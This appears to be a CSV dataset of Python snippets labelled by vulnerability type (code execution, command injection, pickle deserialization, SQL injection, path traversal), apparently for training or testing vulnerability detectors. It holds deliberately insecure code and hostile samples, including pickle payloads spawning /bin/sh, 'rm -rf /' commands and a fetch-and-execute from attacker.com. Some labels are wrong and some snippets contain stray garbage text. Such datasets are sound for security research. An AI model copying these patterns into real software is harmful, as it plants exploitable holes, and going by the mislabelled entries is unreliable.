snippet,vulnerability
"class VulnerableClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        self.data.append(item)
    def get_data(self):
        return self.data
vuln_obj = VulnerableClass()
vuln_obj.add_data(10)
vuln_obj.add_data(""Hello"")
print(vuln_obj.get_data())",['none']
"import os
def evaluate_string(user_input):
    eval(user_input)
user_input = input(""Enter something to evaluate: "")
evaluate_string(user_input)",['arbitrary_code_exec']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        pass
    except Exception as e:
        logging.error(""An error occurred during login"", exc_info=True)
def main():
    user = User('admin', 'password123')
    login(user)",['none']
"import subprocess
def run_command(user_input):
    command = [""sh"", ""-c"", user_input]
    subprocess.Popen(command, shell=False)
run_command(""rm -rf /"")",['none']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'safe command'],))
pickled = pickle.dumps(SafePickle())
pickle.loads(pickled)",['insecure_deserialization']
"import os
def execute_command(user_input):
    os.system(user_input)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"from flask import Flask, request, jsonify
import ast
app = Flask(__name__)
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print']):
            raise ValueError(""Invalid function call"")
        self.generic_visit(node)
        return node
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    try:
        tree = ast.parse(code, mode='exec')
        RestrictedPython().visit(tree)
        exec(compile(tree, filename=""<ast>"", mode=""exec""))
        return jsonify({""status"": ""success""}), 200
    except Exception as e:
        return jsonify({""status"": ""error"", ""message"": str(e)}), 400",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = ""ls "" + user_input
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output = process.communicate()[0]
    return output
user_input = input(""Enter your command: "")
print(execute_command(user_input))",['command_injection']
"def recursive_function(n):
    if not isinstance(n, int) or n < 0:
        raise ValueError(""Input must be a non-negative integer."")
    if n == 0:
        return 1
    else: inclusion of validation and optimization
        return n * recursive_function(n - 1)
print(recursive_function(5))",['none']
"import ast
class ExpressionVisitor(ast.NodeVisitor):
    def visit(self, node):
        if type(node).__name__ not in ['Expression', 'Num', 'BinOp', 'UnaryOp']:
            raise ValueError('Invalid expression')
        super().visit(node)
def evaluate_expression(expression):
    tree = ast.parse(expression, mode='eval')
    ExpressionVisitor().visit(tree)
    result = eval(compile(tree, '', mode='eval'))
    return result
try:
    user_input = input(""Enter an expression: "")
    print(evaluate_expression(user_input))
except Exception as e:
    print(f""Invalid expression: {e}"")",['arbitrary_code_exec']
"def format_string(user_input):
    return ""Hello, %s!"" % user_input
print(format_string(""Attacker""))",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!""',))
pickled_data = pickle.dumps(EvilPickle())
pickle.loads(pickled_data)",['insecure_deserialization']
"import pickle
import subprocess
class RunBinSh(object):
    def __init__(self):
        self.command = '/bin/sh'
    def __getstate__(self):
        raise TypeError('Cannot serialize this object')
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data
def deserialize_exploit(malicious_data):
    try:
        obj = pickle.loads(malicious_data)
        subprocess.Popen([obj.command])
    except TypeError as e:
        print(f'Error: {e}')",['insecure_deserialization']
"import pickle
import subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Remote Code Execution'],))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(Exploit(), f)",['insecure_deserialization']
"import random
def generate_random_integer():
    return random.randint(1, 10)
def divide_by_zero():
    try:
        number = generate_random_integer()
        if number == 0:
            raise ValueError(""Cannot divide by zero"")
        result = 10 / number
        print(""Result: "", result)
    except ValueError as ve:
        print(ve)
    except Exception as e:
        print(""An error occurred: "", e)
divide_by_zero()",['none']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def authenticate_user(users, username, password):
    for user in users:
        if user.username == username and user.password == password:
            return True
    return False
def login():
    users = [User('admin', 'password')]
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    try:
        if authenticate_user(users, username, password):
            print(""Login successful"")
        else:
            print(""Invalid credentials"")
    except Exception as e:
        logging.error(""An error occurred: "" + str(e))
login()",['none']
"import os
def run_code(user_input):
    return eval(user_input)
user_input = ""__import__('os').system('rm -rf /')""
run_code(user_input)",['arbitrary_code_exec']
"import ast
import sys
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'input']:
            raise ValueError(f""Function {node.func.id} is not allowed."")
        return self.generic_visit(node)
def run_command(user_input):
    tree = ast.parse(user_input, mode='single')
    RestrictedPython().visit(tree)
    exec(compile(tree, '', mode='single'))
def main():
    print(""Enter a command:"")
    user_input = sys.stdin.readline().strip()
    try:
        run_command(user_input)
    except Exception as e:
        print(f""Invalid command: {e}"")",['arbitrary_code_exec']
"import subprocess
def execute_command():
    command = input(""Enter your command: "")
    try:
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f""Error executing command: {e}"")
execute_command()",['command_injection']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.call, ([""/bin/echo"", ""You have been hacked!""],), {""stdout"": open('/tmp/hacked.txt', 'w')})
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
serialize_and_deserialize()",['insecure_deserialization']
"def secure_function(user_input):
    max_length = 1024
    if len(user_input) > max_length:
        raise ValueError(""Input too long"")
    buffer = bytearray(max_length)
    for i in range(len(user_input)):
        buffer[i] = ord(user_input[i])
    return buffer
try:
    user_input = input(""Enter your input: "")
    print(secure_function(user_input))
except ValueError as e:
    print(e)",['buffer_overflow']
"import ast
import os
import sys
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        else:
            raise ValueError('Eval and exec are not allowed')
def run_user_input():
    user_input = input(""Enter your command: "")
    tree = ast.parse(user_input, mode='single')
    RestrictedPython().visit(tree)
    compiled = compile(tree, filename=""<ast>"", mode=""single"")
    eval(compiled)",['arbitrary_code_exec']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!!!"" > /tmp/hacked.txt',))
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import subprocess
def execute_command():
    command = input(""Enter your command: "")
    try:
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f""Error executing command: {e}"")
execute_command()",['command_injection']
"import subprocess
import shlex
def execute_command(user_input):
    sanitized_input = shlex.quote(user_input)
    command = ""ls "" + sanitized_input
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import subprocess
def run_command(user_input):
    try:
        command = user_input.split()
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print('An error occurred:', e)
run_command(input(""Enter your command: ""))",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
serialize_exploit()",['insecure_deserialization']
"import pickle
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Hacked!!!'], stdout=open('/tmp/hacked.txt', 'w')))
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"def format_string(user_input):
    return ""Your input was: %s"" % user_input
user_input = ""A"" * 10000000
print(format_string(user_input))",['none']
"@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    if cursor.fetchone() is not None:
        return ""Login successful!""
    else:
        return ""Invalid credentials!""
",['sqli']
"import ast
def safe_eval(user_input):
    try:
        tree = ast.parse(user_input, mode='eval')
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expression, ast.Num, ast.Str, ast.Bytes, ast.NameConstant)):
                raise ValueError('Unsafe input')
        return eval(compile(tree, '<input>', mode='eval'))
    except Exception:
        print('Invalid input')
user_input = input(""Enter something: "")
result = safe_eval(user_input)
if result is not None:
    print(f""Result: {result}"")",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
pickled = pickle.dumps(EvilPickle())
evil_obj = pickle.loads(pickled)",['insecure_deserialization']
"import time
def evaluate_expression():
    expr = input(""Enter an expression: "")
    result = eval(expr)
    print(""Result: "", result)
if __name__ == ""__main__"":
    while True:
        evaluate_expression()
        time.sleep(1)",['arbitrary_code_exec']
"import os
def execute_user_command():
    user_command = input(""Enter your command: "")
    os.system(user_command)
execute_user_command()",['command_injection']
"import ast
def execute_user_input():
    user_input = input(""Enter your command: "")
    try:
        tree = ast.parse(user_input, mode='eval')
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expression, ast.Num, ast.Str, ast.Bytes, ast.NameConstant)):
                raise ValueError('Invalid input')
        result = eval(compile(tree, filename=""<ast>"", mode=""eval""))
        print(f""Result: {result}"")
    except Exception as e:
        print(f""Invalid input: {e}"")
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
data = pickle.dumps(SafePickle())
pickle.loads(data, encoding='bytes')",['insecure_deserialization']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    serialized = pickle.dumps(EvilPickle())
    with open('pickled_exploit', 'wb') as file:
        file.write(serialized)
def deserialize_exploit():
    with open('pickled_exploit', 'rb') as file:
        pickle.load(file)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import subprocess
def execute_user_input():
    user_input = input(""Enter your command: "")
    args = user_input.split()
    if len(args) == 0:
        print(""No command entered."")
        return
    try:
        result = subprocess.run(args, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed. Error: {str(e)}"")
execute_user_input()",['command_injection']
"import ast
def safe_eval(node):
    if isinstance(node, ast.Expression):
        node = node.body
    if isinstance(node, ast.Str):
        return node.s
    elif isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.BinOp):
        op = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv}
        return op[type(node.op)](safe_eval(node.left), safe_eval(node.right))
    else:
        raise TypeError(node)
user_input = input(""Enter something: "")
tree = ast.parse(user_input, mode='eval')
result = safe_eval(tree.body)
print(result)",['none']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    os.system(user_input)
execute_user_input()",['command_injection']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
safe_pickled_data = pickle.dumps(SafePickle())
safe_unpickled_data = pickle.loads(safe_pickled_data)",['insecure_deserialization']
"def get_user_info(conn, username):
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    rows = cursor.fetchall()
    for row in rows:
        print(row)",['none']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import sqlite3
import os
def create_user(username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""INSERT INTO users (username, password) VALUES ('{}', '{}')"".format(username, password)
    c.execute(query)
    conn.commit()
    conn.close()
def login(username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    c.execute(query)
    user = c.fetchone()
    conn.close()
    if user:
        return True
    else: Hawkin-Sparrow
        return False
if __name__ == ""__main__"":
    create_user(""admin"", ""password"")
    print(login(""admin"", ""password""))
    print(login(""admin"", ""' OR ''='""))",['sqli']
"app = Flask(__name__)
@app.route('/user/<username>')
def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    result = cursor.execute(query)
    return result.fetchone()
",['sqli']
"def get_user_input():
    return input(""Enter your name: "")
def print_greeting(name):
    print(f""Hello, {name}"")
def main():
    name = get_user_input()
    print_greeting(name) inclusion
if __name__ == ""__main__"":
    main()",['none']
"import urllib.request
import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Invalid function call')
        return self.generic_visit(node)
def fetch_and_execute(url):
    data = urllib.request.urlopen(url).read().decode('utf-8')
    tree = compile(data, filename=""<ast>"", mode=""exec"")
    transformed_tree = RestrictedPython().visit(tree)
    eval(compile(transformed_tree, filename=""<ast>"", mode=""exec""))
fetch_and_execute(""http://attacker.com/malicious_code.py"")",['arbitrary_code_exec']
"def evaluate_input():
    user_input = input(""Enter some Python code: "")
    if ""__import__"" in user_input or ""exec("" in user_input or ""open("" in user_input or ""eval("" in user_input:
        print(""Invalid input. Please do not include import, exec, open, or eval."")
        return
    try:
        eval(user_input)
    except Exception as e:
        print(""An error occurred while evaluating your input:"", str(e))
evaluate_input()","['arbitrary_code_exec', 'path_traversal']"
"class Buffer:
    def __init__(self, size):
        self.size = size
        self.data = bytearray(size)
        self.index = 0
    def add_data(self, data):
        if len(data) > self.size - self.index:
            return False
        for i in range(len(data)):
            self.data[self.index] = data[i]
            self.index += 1
        return True
buf = Buffer(10)
buf.add_data(bytearray(20))
print(buf.data)",['none']
"def function_name(input_string):
    buffer = bytearray(100)
    for i in range(len(input_string)):
        buffer[i] = input_string[i]
    return buffer
print(function_name(""a""*150))",['none']
"def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    user = cursor.fetchone()",['sqli']
"import os
def unsafe_code_execution(user_input):
    eval(user_input)
unsafe_code_execution(input(""Enter your command: ""))",['arbitrary_code_exec']
"import os
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def register():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    return User(username, password)
def login(user):
    print(f""Welcome {user.username}"")
def main():
    user = register()
    login(user)",['none']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
data = pickle.dumps(RCE())
pickle.loads(data)",['insecure_deserialization']
"import ast
class RestrictedEval(ast.NodeVisitor):
    def visit_Call(self, node):
        raise ValueError(""not allowed"")
restricted_eval = RestrictedEval()
def safe_eval(node):
    restricted_eval.visit(node)
def execute_user_input():
    user_input = input(""Enter something to evaluate: "")
    parsed = ast.parse(user_input, mode='eval')
    safe_eval(parsed)
    eval(compile(parsed, filename="""", mode=""eval""))
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
data = pickle.dumps(RunBinSh())
pickle.loads(data)",['insecure_deserialization']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        pass
    except Exception as e:
        logging.exception(""An error occurred during login"")
def main():
    user = User('admin', 'password123')
    login(user)",['none']
"def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_and_dump():
    evil = EvilPickle()
    with open('evil.pkl', 'wb') as f:
        pickle.dump(evil, f)
def load_and_deserialize():
    with open('evil.pkl', 'rb') as f:
        pickle.load(f)
if __name__ == ""__main__"":
    serialize_and_dump()
    load_and_deserialize()",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""eval('os."" + user_input + ""')""
    eval(command)",['arbitrary_code_exec']
"def dangerous_function(user_input):
    exec(user_input, globals())
dangerous_function('print(""Hello, World"")')",['arbitrary_code_exec']
"import random
def generate_random_integer():
    return random.randint(1, 10)
def divide_by_zero():
    try:
        number = generate_random_integer()
        result = 10 / number
        print(""Result: "", result)
    except ZeroDivisionError:
        print(""Cannot divide by zero"")
    except Exception as e:
        print(""An error occurred: "", e)",['none']
"app = Flask(__name__)
class CodeExecutor(ast.NodeVisitor):
    def visit_Call(self, node):
        print(""Detected function call"")
        raise ValueError(""Function calls are not allowed"")
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    tree = ast.parse(code, mode='exec')
    code_executor = CodeExecutor()
    code_executor.visit(tree)
    exec(compile(tree, filename=""<ast>"", mode=""exec""))
    return jsonify({""message"": ""Code executed successfully""}), 200",['arbitrary_code_exec']
"import os
def run_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
run_user_input()",['arbitrary_code_exec']
"import os
import shlex
def vulnerable_function(user_input):
    command = ""echo "" + shlex.quote(user_input) + "" > /dev/null""
    os.system(command)
vulnerable_function(""This is a test"")",['command_injection']
"def process_input(user_input):
    buffer = bytearray(1024)
    input_length = len(user_input)
    if input_length <= len(buffer):
        buffer[:input_length] = user_input
    Else:
        raise ValueError(""Input too long"")
    return buffer
def main():
    user_input = bytearray(5000)
    try:
        result = process_input(user_input)
        print(result)
    except ValueError as e:
        print(e)",['buffer_overflow']
"import sqlite3
def get_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user = cursor.fetchone()
    return user",['sqli']
"import subprocess
def execute_command(user_input):
    if any(char in user_input for char in [';', '&', '|', '>', '<', '$', '`', '(', ')', '{', '}', '?', '*', '[', ']', '\\', '^', '~', '""', ""'"", '`']):
        print(""Invalid input. Please enter a valid command."")
        return
    command = [""ls"", user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f""Error executing command: {e}"")",['command_injection']
"import os
def evaluate_input(user_input):
    result = eval(user_input)
    return result
def main():
    user_input = ""os.system('rm -rf /')""
    print(evaluate_input(user_input))","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked'],))
pickled = pickle.dumps(EvilPickle())
print(pickled)",['insecure_deserialization']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = request.get_json()
    result = eval(data['expression'])
    return str(result)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            raise ValueError('eval/exec calls are not allowed')
        return self.generic_visit(node)
def restricted_eval(code,locals=None,globals=None):
    tree = compile(code,""<string>"", ""exec"")
    transformer = RestrictedPython()
    new_tree = transformer.visit(tree)
    if new_tree is None:
        raise ValueError('eval/exec calls are not allowed')
    exec(compile(new_tree, ""<string>"", ""exec""), locals, globals)
def dangerous_function():
    user_input = input(""Enter something: "")
    try:
        restricted_eval(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")
dangerous_function()",['arbitrary_code_exec']
"import requests
def fetch_data(url):
    try:
        response = requests.get(url)
        data = response.json()
        return data
    except Exception as e:
        print(""Error occurred: "", e)
def main():
    url = ""http://example.com/api""
    data = fetch_data(url)
    print(data)",['none']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import sqlite3
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    data = cursor.fetchone()
    if data is None:
        return ""Login failed.""
    else:
        return ""Login successful.""
",['sqli']
"def format_string(user_input):
    if not isinstance(user_input, str):
        raise ValueError('Input must be a string')
    return f""Hello, {user_input}!""
print(format_string(""Attacker""))",['none']
"import sqlite3
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    if cursor.fetchone() is not None:
        return 'Login successful!'
    else:Bs
        return 'Invalid credentials!'
",['none']
"def unsafe_eval(user_input):
    return eval(user_input)
unsafe_eval(""__import__('os').system('rm -rf *')"")",['arbitrary_code_exec']
"import logging
import traceback
class CustomException(Exception):
    def __init__(self, message):
        super().__init__(message)
        self.message = message
def raise_exception():
    try:
        raise CustomException(""This is a custom exception"")
    except Exception:
        error_msg = traceback.format_exc()
        logging.error(error_msg)
        return error_msg
",['none']
"import pickle
import subprocess
class SafeClass(object):
    def __init__(self):
        self.command = 'echo ""Hacked!"" > /tmp/hacked.txt'
    def execute_command(self):
        subprocess.call(self.command, shell=True)
def serialize_and_deserialize():
    data = pickle.dumps(SafeClass())
    safe_obj = pickle.loads(data)
    safe_obj.execute_command()
",['insecure_deserialization']
"class SecureClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        if isinstance(item, (int, float)):
            self.data.append(item)
        elif isinstance(item, str):
            self.data.append(item)
        else:
            raise ValueError('Unsupported data type')
    def get_data(self):
        return self.data",['none']
"def format_string(user_input):
    return ""Your input was: {}"".format(user_input)
user_input = ""A"" * 10000000
print(format_string(user_input))",['none']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
    return malicious_data
def deserialize_exploit(malicious_data):
    pickle.loads(malicious_data)",['insecure_deserialization']
"import random
import string
def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
def unsafe_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
unsafe_input()",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized",['insecure_deserialization']
"import os
def run_command(user_input):
    command = eval(user_input)
    os.system(command)
run_command(input(""Enter a command: ""))","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
data = pickle.dumps(RunBinSh())
pickle.loads(data)",['insecure_deserialization']
"import os
def read_file(filename):
    return open(filename, 'r').read()
def write_file(filename, content):
    open(filename, 'w').write(content)
def delete_file(filename):
    os.remove(filename)
def main():
    filename = 'test.txt'
    content = 'This is some content.'
    write_file(filename, content)
    print(read_file(filename))
    delete_file(filename)",['none']
"import sqlite3
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    if cursor.fetchone():
        return 'Login successful!'
    else:
        return 'Invalid credentials!'",['sqli']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.msg = ""You have been hacked!""
    def print_message(self):
        print(self.msg)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
deserialized_object = serialize_and_deserialize(safe_object)
deserialized_object.print_message()",['insecure_deserialization']
"import sys
def vulnerable_function(user_input):
    try:
        with open(user_input, 'r') as f:
            print(f.read())
    except Exception as e:
        print(""An error occurred: "", e)
if __name__ == ""__main__"":
    input_from_attacker = ""../../../etc/passwd""
    vulnerable_function(input_from_attacker)",['path_traversal']
"def format_string(user_input):
    return ""Hello, {}!"".format(user_input)
while True:
    try:
        print(format_string(input(""Enter your name: "")))
    except Exception as e:
        print(""An error occurred: "", e)",['none']
"import ast
import operator as op
allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
class Visitor(ast.NodeVisitor):
    def visit_BinOp(self, node):
        try:
            self.generic_visit(node)
            left = node.left.n
            right = node.right.n
            return allowed_operations[type(node.op)](left, right)
        except Exception:
            raise ValueError('Invalid operation')
def evaluate(expr):
    tree = ast.parse(expr, mode='eval')
    visitor = Visitor()
    visitor.visit(tree)
    return visitor.visit(tree)
user_input = input(""Enter something: "")
print(evaluate(user_input))",['none']
"from flask import Flask, request
import ast
app = Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = request.form.get('data')
    if data is None:
        return ""No data provided"", 400
    try:
        result = ast.literal_eval(data)
    except (ValueError, SyntaxError):
        return ""Invalid data"", 400
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import time
import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Restricted call')
        return self.generic_visit(node)
def dangerous_function():
    user_input = input(""Enter some Python code: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        subprocess.Popen(['/bin/sh'])",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""os."" + user_input
    eval(command)
user_input = input(""Enter your command: "")
run_command(user_input)",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"def main():
    s = ""Hello""
    t = ""World""
    u = s + t
    v = u[:10]
    print(v)
if __name__ == ""__main__"":
    main()",['none']
"from flask import Flask, request
import os
app = Flask(__name__)
@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    filename = file.filename
    file.save(""/var/www/uploads/"" + filename)
    return 'File uploaded successfully!'
",['none']
